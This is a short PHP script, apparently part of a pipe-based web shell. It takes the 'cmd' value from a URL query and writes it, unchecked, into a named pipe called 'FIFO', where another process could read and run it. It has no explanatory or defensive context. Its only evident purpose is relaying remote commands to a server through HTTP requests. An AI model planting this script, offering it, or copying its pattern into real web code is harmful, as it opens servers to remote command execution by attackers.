<?php

  $pipe = fopen("FIFO","w");
  fwrite($pipe, $_GET["cmd"]);
  fclose($pipe);

?>
